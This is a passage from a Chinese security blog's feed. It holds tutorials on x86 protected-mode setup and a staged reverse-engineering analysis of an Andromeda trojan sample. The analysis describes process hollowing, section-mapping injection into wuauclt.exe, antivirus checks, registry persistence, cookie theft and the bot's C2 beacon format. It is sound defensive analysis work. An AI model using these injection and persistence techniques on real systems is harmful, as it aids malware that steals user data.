href="#10、描述符和段描述符高速缓存器的D位" class="headerlink" title="10、描述符和段描述符高速缓存器的D位"></a>10、描述符和段描述符高速缓存器的D位</h2><pre><code>    1. 描述符的D/B位, 对于代码段来说(S=1, X=1), 此位为D, 为0表示16位操作尺寸, 为1表示32位操作尺寸.</code></pre><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/b3f62edc204d9900604cd5e4aabff5d0.png" class=""><p>当描述符进入高速缓存器, 会设置高速缓存器的D位处理器根据此位来设置处理器的默认操作尺寸<br>当程序加电复位时, 处理器的默认操作尺寸是16位</p><h2 id="11-进入保护模式并切换到32位模块使用32位默认操作尺寸"><a href="#11-进入保护模式并切换到32位模块使用32位默认操作尺寸" class="headerlink" title="11. 进入保护模式并切换到32位模块使用32位默认操作尺寸"></a>11. 进入保护模式并切换到32位模块使用32位默认操作尺寸</h2><pre><code>    ;创建#1描述符，保护模式下的代码段描述符    mov dword [bx+0x08],0x7c0001ff         mov dword [bx+0x0c],0x00409800   </code></pre> <img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/88bce34fe7bfe150134969f455a68fb3.png" class="" title="代码段描述符"><ul><li>段基地址: 0x00007C00</li><li>段界限: 0x0001FF</li><li>G位: 为0表示段界限的粒度是byte, 段的大小为: <strong>0x1FF + 1 = 0X2000 = 512字节</strong></li><li>S位: <strong>为1</strong>表明是代码段</li><li>X位: <strong>为1</strong>表明可执行</li><li>P位: <strong>为1</strong>表示段是存在的</li><li>D/B位: <strong>为1</strong>表明是<strong>32位</strong>的默认操作尺寸<br>直接绝对原转移指令: 在保护模式和实模式下的区别</li></ul><pre><code>    ;以下进入保护模式    jmp 0000000000010_0_00B:flush    bits 32    flush:    mov cx,00000000000_10_000B;加载数据段选择子(0x10)    mov ds,cx        ;以下在屏幕上显示"Protect mode OK."     mov byte [0x00],'P'      mov byte [0x02],'r'    mov byte [0x04],'o'</code></pre><p>此时是在保护模式下, 默认操作尺寸是16位还未切换成32位。<br>通过描述符索引取出索引号为<mark>2</mark>的描述符存入高速缓存器中再用里面的基地址+偏移来算出要跳转的线性地址,<mark>线性地址 = 基地址(0x7c00) + 段内偏移量(flush)</mark></p><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/0d0c703da20381bef429ffdec85f20bf.png" class=""><p>执行这条jmp之后CS段选择器被修改, CS的描述符高速缓存器内容也被新的描述符刷新<br>因为在进入<mark>jmp</mark>指令之前很多指令已经进入了流水线按16位的默认操作尺寸进行译码的. 所以在使用bits 32改变了默认操作尺寸之后, 那些指令是错误的. 但是<mark>jmp</mark>指令执行之后会清空流水线, 再按32位默认尺寸重新填充流水线译码.<br>在执行<mark>jmpf</mark>之前, 可以看到这些指令对于写显存字符来说明显是不正确的</p><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/3b6e51376fb51008fe04fb093af0f3d2.png" class="" title="16位默认操作尺寸"><p>在执行<mark>jmpf</mark>指令之后, 可以看到当前处理器的默认操作尺寸是32位</p><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/62661cc280440dc4416627cd1013ec76.png" class="" title="转成二进制可以看出D=1"><p>此时再查看后面的指令流水线的译码就可以看到跟我们的汇编代码是一样的了</p><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/690658f54576778d323cec9d45467004.png" class="" title="32位默认操作尺寸"><p>从此可以看出处理器的当前默认操作尺寸确实会影响指令的译码和执行. </p>]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22-进入保护模式</title>
      <link href="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
      <url>/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ol><li><p>保护模式是要保护什么</p><span id="more"></span><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/17acce13de7fa801e5431f34b95e4867.png" class="" title="17acce13de7fa801e5431f34b95e4867"></li><li><p>全局描述符表GDT和全局描述符表GDTR</p><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/157c9ec465396fb8b62c7a2978d4dbc5-166832631434711.png" class="" title="描述符表"><p>保护模式下: 对内存的访问让然使用段地址和偏移地址, 但是, 在每个段能够访问之前, 必须先进性登记</p></li></ol><ul><li>超出范围的访问会产生一个内部异常的中断</li><li>和一个段有关的信息需要八个字节(64位)来描述, 称之为段描述符, 而在内存中存放这些描述符的地方就叫做描述符表<ul><li>全局描述符表(GDT): 顾名思义是为整个计算机硬件系统服务的, 进入保护模式之前由系统定义</li><li>(GDTR): 描述符表寄存器(48位)<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/21d28d9a8682eb20c1fc1f0938ba542a-166832631434713.png" class="" title="GDTR"></li></ul></li></ul><ol start="3"><li>准备创建全局描述符表</li></ol><ul><li>寻址GDT起始地址的方法<ul><li>从CS段主引导程序0x7c00+gdt_base获取到GDT的起始地址, 然后除以16分别讲余数和商放入dx和ax中(16位(除数)<em>(dx高位和ax低位拼接)(被除数)ax(商)dx(余数))</em></li></ul></li></ul><pre><code>             ;计算GDT所在的逻辑段地址         mov ax,[cs:gdt_base+0x7c00]        ;低16位         mov dx,[cs:gdt_base+0x7c00+0x02]   ;高16位         mov bx,16         div bx         mov ds,ax                          ;令DS指向该段以进行操作         mov bx,dx                          ;段内起始偏移地址    </code></pre><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/029bee4356257f4d8734737427d4815c-166832631434712.png" class=""><center>gdt_base是相对于主引导程序的偏移偏移处存放的是我们自定义的GDT表地址</center><ol start="4"><li><p>描述符的分类<br>描述符像是一个索引或者标签</p><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/64dca01d9aaef20ad3fc23c38cf90fce-166832631434714.png" class="" title="描述符"><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/e50691a47afce4f90646d6c746fd58b2-166832631434716.png" class=""><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/b343ae3ebbe2b9f4f2029b61fa263798-166832631434715.png" class=""></li><li><p>存储器的段描述符- 段的类型和基地址</p><ol><li>每个描述符占八个字节也就是64位<ol><li>如果S=1则当前描述符是存储器的段描述符<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/e5f98567154b1d8b3b15d8220e5c52ea-166832631434717.png" class="" title="段描述符格式"></li></ol></li></ol></li><li><p>存储器的段描述符-段界限及访问控制</p><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/fb8dc67c0a729b770d438eab61806921-166832631434718.png" class="" title="描述符的段界限"></li><li><p>安装存储器的段描述符</p><img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/6a09e183989807ba111d49b25cb34200-166832631434819.png" class="" title="段描述符对齐"></li><li><p>加载全局描述符表寄存器GDTR</p><ol><li>lgdt指令<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/1b2a40a6372b98fe0840ad30357b939b-166832631434820.png" class="" title="lgdt"></li></ol></li></ol><pre><code>             ;初始化描述符表寄存器GDTR         mov word [cs: gdt_size+0x7c00],15  ;描述符表的界限（总字节数减一）         lgdt [cs: gdt_size+0x7c00] </code></pre><ol start="9"><li><p>开启处理器的第21跟地址线A20<br>通过在第21跟地址线加与门来控制输出, 在现在的CPU上已经废弃</p></li><li><p>通过设置寄存器CR0的PE位进入保护模式</p><ol><li>将CR0的第一个比特位置1打开保护模式的开关</li></ol></li><li><p>描述符高速缓存器和保护模式下的内存访问</p><ol><li>将段选择子传送到段选择器后处理器会到描述符表中取出指定的描述符然后将描述符的内容传送到描述符高速缓存器</li><li>将段选择子传送到段选择器, 将描述符中的索引号乘以8得到在描述符表中的偏移量(因为TI位是0所以是从GDT中找)加上GDTR中的线性基地址, 得到一个线性地址从GDT表中取出描述符, 然后将描述符的内容传送到描述符高速缓存器中</li></ol></li><li><p>在调试器中观察实模式和保护模式的内存访问</p><ol><li>在32位的实模式下也是使用高速缓存器保存基地址, 写入的时候会自动用偏移加上基地址去寻址</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
          <category> Windows保护模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Andromeda木马分析</title>
      <link href="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="样本简介"><a href="#样本简介" class="headerlink" title="样本简介"></a>样本简介</h1><table><thead><tr><th align="left">MD5</th><th>文件类型</th></tr></thead><tbody><tr><td align="left">44ff2421bbd7918c6ad68da4fa276e02</td><td>exe</td></tr></tbody></table><span id="more"></span><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210621173535459.png" class="" title="image-20210621173535459"><h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><p>行为监控：释放了大量可执行文件并执行</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613163748901.png" class="" title="image-20210613163748901"><p>执行监控：</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210712225228859.png" class="" title="image-20210712225228859"><p>进程监控：可以看到有大量个跨进程间操作；大致可以看到执行分了几个阶段：MD5.exe&gt;hwwefuxasa.exe&gt;MD5.exe&gt;msiexec.exe&gt;reyefiyevu.exe&gt;msiexec.exe&gt;wuauclt.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613170050764.png" class="" title="image-20210613170050764"><p>文件创建监控：</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613172155974.png" class="" title="image-20210613172155974"><p>文件删除监控：</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613174023213.png" class="" title="image-20210613174023213"><h2 id="第一阶段：MD5-exe"><a href="#第一阶段：MD5-exe" class="headerlink" title="第一阶段：MD5.exe"></a>第一阶段：MD5.exe</h2><p>释放了一些dll和exe文件在之后的下一阶段使用</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614211545714.png" class="" title="image-20210614211545714"><p>创建temp文件夹路径并设置文件夹属性</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614203558637.png" class="" title="image-20210614203558637"><p>在temp文件夹下创建文件</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614204018971.png" class="" title="image-20210614204018971"><p>往文件内写入内容</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614204358356.png" class="" title="image-20210614204358356"><p>设置文件时间</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614205438515.png" class="" title="image-20210614205438515"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614205635004.png" class="" title="image-20210614205635004"><p>创建了一个exe文件&amp;几个dll文件+ric文件</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614212511913.png" class="" title="image-20210614212511913"><p>启动heswfuxasa.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614213229679.png" class="" title="image-20210614213229679"><p>设置注册表启动heswfuxasa.exe启动附加调试器</p><h2 id="第二阶段：heswfuxasa-exe"><a href="#第二阶段：heswfuxasa-exe" class="headerlink" title="第二阶段：heswfuxasa.exe"></a>第二阶段：heswfuxasa.exe</h2><p>通过GetProcAddress来获取所需的函数</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615215928628.png" class="" title="image-20210615215928628"><p>LoadLibrary来加载所需的模块</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615220210230.png" class="" title="image-20210615220210230"><p>以挂起的方式创建进程</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615220933949.png" class="" title="image-20210615220933949"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615221701331.png" class="" title="image-20210615221701331"><p>卸载挂起进程内存空间数据</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615223426537.png" class="" title="image-20210615223426537"><p>以读写执行的权限在目标进程创建开辟内存空间</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615224548100.png" class="" title="image-20210615224548100"><p>在内存中写入数据</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615225320320.png" class="" title="image-20210615225320320"><p>在执行到GetThreadContext的时候通过pContext参数指向的CONTEXT结构找到新的线程入口点</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210621174956056.png" class="" title="image-20210621174956056"><p>然后在调用ResumeThread之前通过process Hacker修改一下线程入口点方便附加调试(这里可以使用<code>CC</code>或者<code>EB FE</code>来修改入口点)</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617003253716.png" class="" title="image-20210617003253716"><h2 id="第三阶段：MD5-exe"><a href="#第三阶段：MD5-exe" class="headerlink" title="第三阶段：MD5.exe"></a>第三阶段：MD5.exe</h2><p>用x32Dbg附加调试，再将此处的内存修改为之前的内容（因为前面为了方便调试修改了两个字节为<code>EB FE</code>）</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617144509637.png" class="" title="image-20210617144509637"><p>为当前进程加载新的资源模块</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617165346529.png" class="" title="image-20210617165346529"><p>使用加密服务</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617172343847.png" class="" title="image-20210617172343847"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617172751662.png" class="" title="image-20210617172751662"><p>拼接路径删除之前释放的文件</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617182706462.png" class="" title="image-20210617182706462"><p>装载新的资源模块</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617184302238.png" class="" title="image-20210617184302238"><p>继续以挂起的方式创建进程，创建自身的新进程并修改进程内存空间</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617213637015.png" class="" title="image-20210617213637015"><p>仍然在挂起处暂停，修改线程入口点为无限循环，方便附加调试(将<code>E8 90</code>改为<code>EB FE</code>)</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210625144911095.png" class="" title="image-20210625144911095"><h2 id="第四阶段：MD5-exe"><a href="#第四阶段：MD5-exe" class="headerlink" title="第四阶段：MD5.exe"></a>第四阶段：MD5.exe</h2><p>获取系统快照信息来遍历进程：查找是否有卡巴的杀软avp.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618003204591.png" class="" title="image-20210618003204591"><p>释放文件msiexec.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618100027438.png" class="" title="image-20210618100027438"><p>将MD5.exe的内容拷贝到0F48F.tmp中，重新开辟一块内存空间并将数据读入开辟的内存</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618151108108.png" class="" title="image-20210618151108108"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618151951237.png" class="" title="image-20210618151951237"><p>删除0FFBF.tmp文件</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618160131848.png" class="" title="image-20210618160131848"><ul><li>使用ShellExecuteExW的方式启动msiexec.exe(可以设置注册表调试器附加启动)</li></ul><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618161911590.png" class="" title="image-20210618161911590"><h2 id="第五阶段：msiexec-exe"><a href="#第五阶段：msiexec-exe" class="headerlink" title="第五阶段：msiexec.exe"></a>第五阶段：msiexec.exe</h2><p>获取当前用户使用的桌面语言：0x804表示简体中文</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618180041834.png" class="" title="image-20210618180041834"><p>在<code>%temp%</code>目录下创建新的wehexukaje.Gav文件并写入内容</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618222132923.png" class="" title="image-20210618222132923"><p>并修改文件时间</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618222101458.png" class="" title="image-20210618222101458"><p>重新创建befunvatur.dll、Ziniyucenaqe.dll、xizitixeqob.dll、salebolotew.dll、reyefiyevu.exe、nst5FFB.tmp、</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618222023450.png" class="" title="image-20210618222023450"><p>启动新进程reyefiyevu.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618230409713.png" class="" title="image-20210618230409713"><h2 id="第六阶段：reyefiyevu-exe"><a href="#第六阶段：reyefiyevu-exe" class="headerlink" title="第六阶段：reyefiyevu.exe"></a>第六阶段：reyefiyevu.exe</h2><p>通过IDA可以看到当前程序主要执行了，获取当前线程的句柄并修改优先级并加载xifuzinahi.dll的操作</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619004513010.png" class="" title="image-20210619004513010"><p>加载xifuzinahi.dll之后做了一些开辟内存开辟，拷贝，获取模块以及字符串等操作</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619005700963.png" class="" title="image-20210619005700963"><p>加载Ziniyucenaqe.dll获取用户默认的语言环境</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619173810398.png" class="" title="image-20210619173810398"><p>加载Befunuvatur.dll后查看导=导入函数可以看到有一些进程和内存相关的操作，来动态调试一下</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619174325026.png" class="" title="image-20210619174325026"><p>以挂起的方式创建进程msiexec.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619201624743.png" class="" title="image-20210619201624743"><p>以修改线程OEP处内存为无限循环的方式附加进程msiexec.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619210354720.png" class="" title="image-20210619210354720"><h2 id="第七阶段：msiexec-exe"><a href="#第七阶段：msiexec-exe" class="headerlink" title="第七阶段：msiexec.exe"></a>第七阶段：msiexec.exe</h2><p>加载新的资源</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619220231614.png" class="" title="image-20210619220231614"><p>获取释放的文件名并删除</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619224453665.png" class="" title="image-20210619224453665"><p>继续创建傀儡进程启动msiexec.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619230600359.png" class="" title="image-20210619230600359"><p>修改线程OEP为无限循环<code>EB FE</code></p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619231722619.png" class="" title="image-20210619231722619"><h2 id="第八阶段：msiexec-exe"><a href="#第八阶段：msiexec-exe" class="headerlink" title="第八阶段：msiexec.exe"></a>第八阶段：msiexec.exe</h2><p>创建一个互斥体来防止多开</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619234819467.png" class="" title="image-20210619234819467"><p>遍历当前进程</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620112130335.png" class="" title="image-20210620112130335"><p>检测注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Disk\Enum</code>下的键值</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620110024956.png" class="" title="image-20210620110024956"><p>进入新写入的内存执行后续代码</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620154742685.png" class="" title="image-20210620154742685"><p>将现有<code>%temp%</code>路径下的msiexec.exe拷贝到”C:\ProgramData\svchost.exe”</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620003955673.png" class="" title="image-20210620003955673"><p>将”C:\ProgramData\svchost.exe”写入注册表自启动</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620004503674.png" class="" title="image-20210620004503674"><p>使用文件映射（NtCreateSection<code>+</code>NtMapViewOfSection）的方式来执行远程进程注入</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620162327198.png" class="" title="image-20210620162327198"><p>以挂起的方式创建wuauclt.exe</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620163009867.png" class="" title="image-20210620163009867"><p>修改线程OEP为无限循环（<code>EB FE</code>）</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210625144750506.png" class="" title="image-20210625144750506"><h2 id="第九个阶段：wuauclt-exe"><a href="#第九个阶段：wuauclt-exe" class="headerlink" title="第九个阶段：wuauclt.exe"></a>第九个阶段：wuauclt.exe</h2><p>通过调用GetEnvironmentVariableW从环境变量获取启动程序的完整路径</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706210151786.png" class="" title="image-20210706210151786"><p>再用SetEnvironmentVariableW传入空字符串来重置该变量</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706210941966.png" class="" title="image-20210706210941966"><p>用获取到的系统卷信息创建一个互斥体防止进程多开</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210630233459555.png" class="" title="image-20210630233459555"><p>创建一个新文件文件名和后缀米随机并将自身复制进去，写入注册表自启动之后再将msiexec.exe删除</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706215336940.png" class="" title="image-20210706215336940"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706215626718.png" class="" title="image-20210706215626718"><p><strong>然后初始化网络创建新的线程</strong></p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706220343714.png" class="" title="image-20210706220343714"><p>获取系统的版本号</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705214914849.png" class="" title="image-20210705214914849"><p>查看注册表判断是否启用远程PRC限制</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705215604773.png" class="" title="image-20210705215604773"><p>获取本地的IP</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705221012684.png" class="" title="image-20210705221012684"><p>获取浏览器的cookie</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210707120259771.png" class="" title="image-20210707120259771"><p>通过对发送消息的格式和前面的一些行为来判断可能是属于仙女座（Andromeda ）的样本</p><pre><code>id:%lu|bid:%lu|bv:%lu|sv:%lu|pa:%lu|la:%lu|ar:%luid 值根据本地系统卷信息产生bid 值是硬编码的，可能指编译id.bv值也是硬编码的，可能指编译版本（目前是206h(518))sv值代表受害机器的系统版本pa值是调用ZwQueryInformationProcess API的返回值，用以确定OS是32位还是64位。la值是根据www.update.microsoft.com的IP地址而生成的ar值是调用CheckTokenMembership API的返回值，确认bot是否运行在管理员权限下。</code></pre><p>加密前的字符串</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210701211959385.png" class="" title="image-20210701211959385"><p>第一次加密：自定义加密</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210707102207882.png" class="" title="image-20210707102207882"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155750770.png" class="" title="image-20210706155750770"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155621097.png" class="" title="image-20210706155621097"><p>二次加密：再经过base64加密</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210707103351430.png" class="" title="image-20210707103351430"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155829786.png" class="" title="image-20210706155829786"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155702049.png" class="" title="image-20210706155702049"><p>将数据发送往服务器并接收服务器返回的消息</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706161529651.png" class="" title="image-20210706161529651"><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210704000806080.png" class="" title="image-20210704000806080"><p>这是从网上找到的仙女座C&amp;C服务器的Web面板的图片</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706160912985.png" class="" title="image-20210706160912985"><p>如果服务器可以正常连接服务器下发数据包，病毒程序根据接收到的包解密后得到的ID执行不同的操作</p><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705154023635.png" class="" 